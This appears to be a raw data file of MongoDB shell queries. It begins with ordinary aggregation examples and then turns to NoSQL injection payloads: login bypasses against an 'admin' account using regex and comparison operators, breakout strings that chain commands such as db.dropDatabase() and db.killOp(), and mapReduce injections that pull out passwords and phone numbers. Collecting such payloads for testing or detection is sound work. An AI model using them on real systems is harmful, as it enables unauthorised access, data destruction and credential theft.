db.bids.aggregate( [ { $project: { item: 1, startAt: { $literal: 1 } } } ] )
db.sales.aggregate( [ { $project: { x: "$year", y: { $ln: "$sales" } } } ] )
db.examples.aggregate([ { $project: { bitsNeeded: { $floor: { $add: [ 1, { $log: [ "$positiveInt", 2 ] } ] } } } } ])
db.samples.aggregate( [ { $project: { pH: { $multiply: [ -1, { $log10: "$H3O" } ] } } } ] )
db.inventory.aggregate( [ { $project: { item: 1, qty: 1, qtyLt250: { $lt: [ "$qty", 250 ] }, _id: 0 } } ] )
db.inventory.aggregate( [ { $project: { item: 1, qty: 1, qtyLte250: { $lte: [ "$qty", 250 ] }, _id: 0 } } ] )
db.grades.aggregate( [ { $project: { adjustedGrades: { $map: { input: "$quizzes", as: "grade", in: { $add: [ "$$grade", 2 ] } } } } } ] )
db.deliveries.aggregate( [ { $project: { city: "$city", integerValues: { $map: { input: "$distances", as: "integerValue", in: { $trunc: "$$integerValue" } } } } } ] )
db.temperatures.aggregate( [ { $project: { _id: 0, date: "$date", tempsStep1: { $map: { input: "$temps", as: "tempInCelsius", in: { $multiply: [ "$$tempInCelsius", 9/5 ] } } } } }, { $project: { date: "$date", temps_in_Fahrenheit: { $map: { input: "$tempsStep1", as: "tempStep1", in: { $add: [ "$$tempStep1", 32 ] } } } } } ] )
db.sales.aggregate( [ { $group: { _id: "$item", maxTotalAmount: { $max: { $multiply: [ "$price", "$quantity" ] } }, maxQuantity: { $max: "$quantity" } } } ] )
db.students.aggregate([ { $project: { quizMax: { $max: "$quizzes"}, labMax: { $max: "$labs" }, examMax: { $max: [ "$final", "$midterm" ] } } } ])
db.orders.aggregate([ { $lookup: { from: "items", localField: "item", // field in the orders collection foreignField: "item", // field in the items collection as: "fromItems" } }, { $replaceRoot: { newRoot: { $mergeObjects: [ { $arrayElemAt: [ "$fromItems", 0 ] }, "$$ROOT" ] } } }, { $project: { fromItems: 0 } } ])
db.sales.aggregate( [ { $group: { _id: "$item", mergedSales: { $mergeObjects: "$quantity" } } } ])
db.articles.aggregate( [ { $match: { $text: { $search: "cake" } } }, { $group: { _id: { $meta: "textScore" }, count: { $sum: 1 } } } ] )
db.articles.aggregate( [ { $match: { $text: { $search: "cake" } } }, { $group: { _id: { $meta: "textScore" }, count: { $sum: 1 } } } ] )
db.students.aggregate([ { $project: { quizMin: { $min: "$quizzes"}, labMin: { $min: "$labs" }, examMin: { $min: [ "$final", "$midterm" ] } } } ])
db.planning.aggregate( [ { $project: { remainder: { $mod: [ "$hours", "$tasks" ] } } } ] )
db.sales.aggregate( [ { $project: { date: 1, item: 1, total: { $multiply: [ "$price", "$quantity" ] } } } ] )
db.inventory.aggregate( [ { $project: { item: 1, qty: 1, qtyNe250: { $ne: [ "$qty", 250 ] }, _id: 0 } } ] )
db.inventory.aggregate( [ { $project: { item: 1, result: { $not: [ { $gt: [ "$qty", 250 ] } ] } } } ] )
db.inventory.aggregate( [ { $project: { item: 1, dimensions: { $objectToArray: "$dimensions" } } } ] )
db.inventory.aggregate([ { $project: { warehouses: { $objectToArray: "$instock" } } }, { $unwind: "$warehouses" }, { $group: { _id: "$warehouses.k", total: { $sum: "$warehouses.v" } } } ])
db.inventory.aggregate( [ { $addFields: { instock: { $objectToArray: "$instock" } } }, { $addFields: { instock: { $concatArrays: [ "$instock", [ { k: "total", v: { $sum: "$instock.v" } } ] ] } } } , { $addFields: { instock: { $arrayToObject: "$instock" } } } ] )
db.inventory.aggregate( [ { $project: { item: 1, result: { $or: [ { $gt: [ "$qty", 250 ] }, { $lt: [ "$qty", 200 ] } ] } } } ] )
db.quizzes.aggregate([ { $project: { variance: { $pow: [ { $stdDevPop: "$scores.score" }, 2 ] } } } ])
db.sales.aggregate( [ { $group: { _id: { day: { $dayOfYear: "$date"}, year: { $year: "$date" } }, itemsSold: { $push: { item: "$item", quantity: "$quantity" } } } } ] )
db.distances.aggregate([{ $project: { _id: 0, city: 1, Rest_stops: { $range: [ 0, "$distance", 25 ] } } }])
db.probability.aggregate( [ { $group: { _id: "$experimentId", probabilityArr: { $push: "$probability" } } }, { $project: { description: 1, results: { $reduce: { input: "$probabilityArr", initialValue: 1, in: { $multiply: [ "$$value", "$$this" ] } } } } } ] )
db.clothes.aggregate( [ { $project: { discountedPrice: { $reduce: { input: "$discounts", initialValue: "$price", in: { $multiply: [ "$$value", { $subtract: [ 1, "$$this" ] } ] } } } } } ] )
db.people.aggregate( [ // Filter to return only non-empty arrays { $match: { hobbies: { $gt: [ ] } } }, { $project: { name: 1, bio: { $reduce: { input: "$hobbies", initialValue: "My hobbies include:", in: { $concat: [ "$$value", { $cond: { if: { $eq: [ "$$value", "My hobbies include:" ] }, then: " ", else: ", " } }, "$$this" ] } } } } } ] )
db.arrayconcat.aggregate( [ { $project: { collapsed: { $reduce: { input: "$arr", initialValue: [ ], in: { $concatArrays: [ "$$value", "$$this" ] } } } } } ] )
db.arrayconcat.aggregate( [ { $project: { results: { $reduce: { input: "$arr", initialValue: [ ], in: { collapsed: { $concatArrays: [ "$$value.collapsed", "$$this" ] }, firstValues: { $concatArrays: [ "$$value.firstValues", { $slice: [ "$$this", 1 ] } ] } } } } } } ] )
db.users.aggregate([ { $project: { name: 1, reverseFavorites: { $reverseArray: "$favorites" } } } ])
db.experiments.aggregate( [ { $project: { A: 1, B: 1, inBOnly: { $setDifference: [ "$B", "$A" ] }, _id: 0 } } ] )
db.experiments.aggregate( [ { $project: { A: 1, B: 1, sameElements: { $setEquals: [ "$A", "$B" ] }, _id: 0 } } ] )
db.experiments.aggregate( [ { $project: { A: 1, B: 1, commonToBoth: { $setIntersection: [ "$A", "$B" ] }, _id: 0 } } ] )
db.experiments.aggregate( [ { $project: { A:1, B: 1, AisSubset: { $setIsSubset: [ "$A", "$B" ] }, _id:0 } } ] )
db.experiments.aggregate( [ { $project: { A:1, B: 1, allValues: { $setUnion: [ "$A", "$B" ] }, _id: 0 } } ] )
db.inventory.aggregate( [ { $project: { item: 1, numberOfColors: { $size: "$colors" } } } ] )
db.users.aggregate([ { $project: { name: 1, threeFavorites: { $slice: [ "$favorites", 3 ] } } } ])
db.deliveries.aggregate([ { $project : { city_state : { $split: ["$city", ", "] }, qty : 1 } }, { $unwind : "$city_state" }, { $match : { city_state : /[A-Z]{2}/ } }, { $group : { _id: { state: "$city_state" }, total_qty : { $sum: "$qty" } } }, { $sort : { total_qty : -1 } } ]);
db.points.aggregate([ { $project: { distance: { $sqrt: { $add: [ { $pow: [ { $subtract: [ "$p2.y", "$p1.y" ] }, 2 ] }, { $pow: [ { $subtract: [ "$p2.x", "$p1.x" ] }, 2 ] } ] } } } } ])
db.users.aggregate([ { $group: { _id: "$quiz", stdDev: { $stdDevPop: "$score" } } } ])
db.quizzes.aggregate([ { $project: { stdDev: { $stdDevPop: "$scores.score" } } } ])
db.users.aggregate( [ { $sample: { size: 100 } }, { $group: { _id: null, ageStdDev: { $stdDevSamp: "$age" } } } ] )
db.inventory.aggregate( [ { $project: { item: 1, comparisonResult: { $strcasecmp: [ "$quarter", "13q4" ] } } } ] )
db.food.aggregate( [ { $project: { name: 1, length: { $strLenBytes: "$name" } } } ] )
db.food.aggregate( [ { $project: { name: 1, length: { $strLenCP: "$name" } } } ] )
db.inventory.aggregate( [ { $project: { item: 1, yearSubstring: { $substr: [ "$quarter", 0, 2 ] }, quarterSubtring: { $substr: [ "$quarter", 2, -1 ] } } } ] )
db.inventory.aggregate( [ { $project: { item: 1, yearSubstring: { $substrBytes: [ "$quarter", 0, 2 ] }, quarterSubtring: { $substrBytes: [ "$quarter", 2, { $subtract: [ { $strLenBytes: "$quarter" }, 2 ] } ] } } } ] )
db.food.aggregate( [ { $project: { name: 1, menuCode: { $substrBytes: [ "$name", 0, 3 ] } } } ] )
db.inventory.aggregate( [ { $project: { item: 1, yearSubstring: { $substrCP: [ "$quarter", 0, 2 ] }, quarterSubtring: { $substrCP: [ "$quarter", 2, { $subtract: [ { $strLenCP: "$quarter" }, 2 ] } ] } } } ] )
db.food.aggregate( [ { $project: { name: 1, menuCode: { $substrCP: [ "$name", 0, 3 ] } } } ] )
db.sales.aggregate( [ { $project: { item: 1, total: { $subtract: [ { $add: [ "$price", "$fee" ] }, "$discount" ] } } } ] )
db.sales.aggregate( [ { $project: { item: 1, dateDifference: { $subtract: [ new Date(), "$date" ] } } } ] )
db.sales.aggregate( [ { $project: { item: 1, dateDifference: { $subtract: [ "$date", 5 * 60 * 1000 ] } } } ] )
db.sales.aggregate( [ { $group: { _id: { day: { $dayOfYear: "$date"}, year: { $year: "$date" } }, totalAmount: { $sum: { $multiply: [ "$price", "$quantity" ] } }, count: { $sum: 1 } } } ] )
db.sales.aggregate( [ { $group: { _id: { day: { $dayOfYear: "$date"}, year: { $year: "$date" } }, totalAmount: { $sum: "$qty" }, count: { $sum: 1 } } } ] )
db.students.aggregate([ { $project: { quizTotal: { $sum: "$quizzes"}, labTotal: { $sum: "$labs" }, examTotal: { $sum: [ "$final", "$midterm" ] } } } ])
db.grades.aggregate( [ { $project: { name: 1, summary: { $switch: { branches: [ { case: { $gte : [ { $avg : "$scores" }, 90 ] }, then: "Doing great!" }, { case: { $and : [ { $gte : [ { $avg : "$scores" }, 80 ] }, { $lt : [ { $avg : "$scores" }, 90 ] } ] }, then: "Doing pretty well." }, { case: { $lt : [ { $avg : "$scores" }, 80 ] }, then: "Needs improvement." } ], default: "No scores found." } } } } ] )
db.inventory.aggregate( [ { $project: { item: { $toLower: "$item" }, description: { $toLower: "$description" } } } ] )
db.inventory.aggregate( [ { $project: { item: { $toUpper: "$item" }, description: { $toUpper: "$description" } } } ] )
db.samples.aggregate([ { $project: { value: 1, truncatedValue: { $trunc: "$value" } } } ])
db.coll.aggregate([{ $project: { a : { $type: "$a" } } }])
db.matrices.insertMany([ { matrix: [[1, 2], [2, 3], [3, 4]] }, { matrix: [[8, 7], [7, 6], [5, 4]] } ])
db.matrices.aggregate([{ $project: { _id: false, transposed: { $zip: { inputs: [ { $arrayElemAt: [ "$matrix", 0 ] }, { $arrayElemAt: [ "$matrix", 1 ] }, { $arrayElemAt: [ "$matrix", 2 ] }, ] } } } }])
db.pages.save( { category: "unix", pages: [ { title: "awk for beginners", reviews: 5 }, { title: "sed for newbies", reviews: 0 }, { title: "grep made simple", reviews: 2 } ] } )
db.pages.aggregate([{ $project: { _id: false, pages: { $filter: { input: { $zip: { inputs: [ "$pages", { $range: [0, { $size: "$pages" }] } ] } }, as: "pageWithIndex", cond: { $let: { vars: { page: { $arrayElemAt: [ "$$pageWithIndex", 0 ] } }, in: { $gte: [ "$$page.reviews", 1 ] } } } } } } }])
db.runCommand( { delete: "orders", deletes: [ { q: { status: "D" }, limit: 1 } ] } )
db.runCommand( { delete: "orders", deletes: [ { q: { status: "D" }, limit: 0 } ], writeConcern: { w: "majority", wtimeout: 5000 } } )
db.runCommand( { delete: "orders", deletes: [ { q: { }, limit: 0 } ], writeConcern: { w: "majority", wtimeout: 5000 } } )
db.runCommand( { delete: "orders", deletes: [ { q: { status: "D" }, limit: 0 }, { q: { cust_num: 99999, item: "abc123", status: "A" }, limit: 1 } ], ordered: false, writeConcern: { w: 1 } })
db.runCommand({ delete: "myColl", deletes: [ { q: { category: "cafe", status: "a" }, limit: 0, collation: { locale: "fr", strength: 1 } } ] })
db.users.find({username: "admin", password: /.*/})
db.users.find({username: "admin", password: {$nin: [/./]}})
db.users.find({username: "admin", password: {$in: [/.*/]}})
db.users.find({Username: "admin", password: {$nin:[/./]}})
db.users.find({Username: "admin", password: { $regex: /.*/i }})
db.users.find({Username: "admin", password: { $regex: /.*/ }})
db.users.find({username: "admin", password: /^x/})
db.users.find({username: "admin", password: {$nin: [/^x/]}})
db.users.find({username: "admin", password: {$in: [/^x/]}})
db.users.find({Username: "admin", password: {$nin: [/^x/]}})
db.users.find({Username: "admin", password: { $regex: [/^x/i] }})
db.users.find({Username: "admin", password: { $regex: [/^x/] }})
db.users.find({Username: "admin", password: { $regex: [/^x/m] }})
db.users.find({Username: "admin", password: { $regex: [/^x/x] }})
db.users.find({Username: "admin", password: { $regex: [/^x/s] }})
db.users.find({Username: "admin", password: { $regex: [/^xyz/] }})
db.users.find({Username: "admin", password: { $regex: [/^aa/] }})
db.users.find({Username: "admin", password: { $regex: [/^a.*z/] }})
db.users.find({Username: "admin", password: { $regex: [/^a.*$/] }})
db.users.find({Username: "admin", password: { $regex: '^a' }})
db.users.find({Username: "admin", password: { $regex: '^abc' }})
db.users.find({Username: "admin", password: { $regex: '^a', $option: 'i'}})
db.users.find({Username: "admin", password: { $regex: '^abc', $option: 'm'}})
db.users.find({Username: "admin", password: { $regex: '^xyz', $option: 'x'}})
db.users.find({Username: "admin", password: { $regex: '^a.*', $option: 's'}})
db.users.find({Username: "admin", password: { $regex: /^a.*$/, $option: 'i'}})
db.users.find({Username: "admin", password: { $regex: /^xy$/, $option: 's'}})
db.users.find({Username: "admin", password: { $regex: /^abc/, $option: 'x'}})
db.users.find({Username: "admin", password: { $regex: /^xyz/, $option: 'm'}})
db.users.find({Username: "admin", password: { $regex: /^ABC/, $option: 'i'}})
db.users.find({ username: {$ne: ""}, password: {$regex: /.*/} })
db.users.find({ username: {$not: ""}, password: {$regex: /.*/} })
db.users.find({ username: {$gt: ""}, password: {$regex: /.*/} })
db.users.find({ username: {$gte: ""}, password: {$regex: /.*/} })
db.users.find({ username: {$ne: null}, password: {$regex: /.*/} })
db.users.find({ username: {$nin: []}, password: {$regex: /.*/} })
db.users.find({ username: {$nin: [""]}, password: {$regex: /.*/} })
db.users.find({ username: {$ne: ""}, password: {$regex: '.*'} })
db.users.find({ username: {$not: ""}, password: {$regex: '.*'} })
db.users.find({ username: {$gt: ""}, password: {$regex: '.*'} })
db.users.find({ username: {$gte: ""}, password: {$regex: '.*'} })
db.users.find({ username: {$ne: null}, password: {$regex: '.*'} })
db.users.find({ username: {$nin: []}, password: {$regex: '.*'} })
db.users.find({ username: {$nin: [""]}, password: {$regex: '.*'} })
db.users.find({ username: {$ne: ""}, password: {$regex: /^abc/} })
db.users.find({ username: {$not: ""}, password: {$regex: /^abc/} })
db.users.find({ username: {$gt: ""}, password: {$regex: /^abc/} })
db.users.find({ username: {$gte: ""}, password: {$regex: /^abc/} })
db.users.find({ username: {$ne: null}, password: {$regex: /^abc/} })
db.users.find({ username: {$nin: []}, password: {$regex: /^abc/} })
db.users.find({ username: {$nin: [""]}, password: {$regex: /^abc/} })
db.users.find({ username: {$ne: ""}, password: {$regex: /^ABC/i} })
db.users.find({ username: {$not: ""}, password: {$regex: /^ABC/i} })
db.users.find({ username: {$gt: ""}, password: {$regex: /^ABC/i} })
db.users.find({ username: {$gte: ""}, password: {$regex: /^ABC/i} })
db.users.find({ username: {$ne: null}, password: {$regex: /^ABC/i} })
db.users.find({ username: {$nin: []}, password: {$regex: /^ABC/i} })
db.users.find({ username: {$nin: [""]}, password: {$regex: /^ABC/i} })
db.users.find({username: "admin"});db.dropDatabase()//@, password: "abcd"*^
db.users.find({username: "admin"});db.fsyncLock()//@, password: "abcd"*^
db.users.find({username: "admin"});db.getCollection("auth")//@, password: "abcd"*^
db.users.find({username: "admin"});db.getCollectionInfos()//@, password: "abcd"*^
db.users.find({username: "admin"});db.getCollectionNames()//@, password: "abcd"*^
db.users.find({username: "admin"});db.getName()//@, password: "abcd"*^
db.users.find({username: "admin"});db.getSiblingDB('users')//@, password: "abcd"*^
db.users.find({username: "admin"});db.hostInfo()//@, password: "abcd"*^
db.users.find({username: "admin"});db.isMaster()//@, password: "abcd"*^
db.users.find({username: "admin"});db.killOp()//@, password: "abcd"*^
db.users.find({username: "admin"});db.loadServerScripts()//@, password: "abcd"*^
db.users.find({username: "admin"});db.logout()//@, password: "abcd"*^
db.users.find({username: "admin"});db.printReplicationInfo()//@, password: "abcd"*^
db.users.find({username: "admin"});db.printShardingStatus()//@, password: "abcd"*^
db.users.find({username: "admin"});db.printSlaveReplicationInfo()//@, password: "abcd"*^
db.users.find({username: "admin"});db.serverBuildInfo()//@, password: "abcd"*^
db.users.find({username: "admin"});db.serverCmdLineOpts()//@, password: "abcd"*^
db.users.find({username: "admin"});db.serverStatus()//@, password: "abcd"*^
db.users.find({username: "admin"});db.setLogLevel(1)//@, password: "abcd"*^
db.users.find({username: "admin"});db.setLogLevel(2, "storage.journal" )//@, password: "abcd"*^
db.users.find({username: "admin"});db.stats()//@, password: "abcd"*^
db.users.find({username: "admin"});db.stats(1024)//@, password: "abcd"*^
db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example" } )//, 1^; *, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } ^
db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example", query: {this.name: {$ne: 0}} } )//, 1^; *, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } ^
db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example", query: {this.name: {$gt: ""}} } )//, 1^; *, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } ^
db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example", query: {this.name: {$not: ""}} } )//, 1^; *, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } ^
db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example", query: {this.name: {$gt: ""}}, sort: {this.name: 1} } )//, 1^; *, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } ^
db.users.mapReduce( function() { emit(this.name, this.password); }, function(name, password) { return password; }, { out: "map_reduce_example", query: {this.name: {$gt: ""}}, limit: 10 } )//, 1^; *, function(name, count) { return Array.sum(totalCount); }, { out: "map_reduce_example" } ^
db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example" } )//this.price^; *, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } ^
db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {$gt: ""}} } )//this.price^; *, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } ^
db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {$not: ""}} } )//this.price^; *, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } ^
db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {$ne: ""}} } )//this.price^; *, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } ^
db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {$gte: ""}} } )//this.price^; *, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } ^
db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {$gt: ""}}, limit: 5 } )//this.price^; *, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } ^
db.orders.mapReduce( function() { emit(this.cust_id, this.name); }, function(keyCustId, name) { return name; }, { out: "map_reduce_example", query: {this.name: {$gt: ""}}, sort: {this.name: 1} } )//this.price^; *, function(keyCustId, valuesPrices) { return Array.sum(valuesPrices); }, { out: "map_reduce_example" } ^
db.posts.mapReduce( function() { emit(this.user_id,this.phoneno); }, function(key, values) {return  phoneno}, { query:{status:"active"}, out:"user_phone" })//1^; *, function(key, values) {return  Array.sum(values)}, { query:{status:"active"}, out:"post_total" }^
db.posts.mapReduce( function() { emit(this.user_id,this.phoneno); }, function(key, values) {return  phoneno}, { out:"user_phone" })//1^; *, function(key, values) {return  Array.sum(values)}, { query:{status:"active"}, out:"post_total" }^
db.posts.mapReduce( function() { emit(this.user_id,this.phoneno); }, function(key, values) {return  phoneno}, { limit: 20, out:"user_phone" })//1^; *, function(key, values) {return  Array.sum(values)}, { query:{status:"active"}, out:"post_total" }^
db.posts.mapReduce( function() { emit(this.user_id,this.phoneno); }, function(key, values) {return  phoneno}, { sort: {this.user_id: 1}, out:"user_phone" })//1^; *, function(key, values) {return  Array.sum(values)}, { query:{status:"active"}, out:"post_total" }^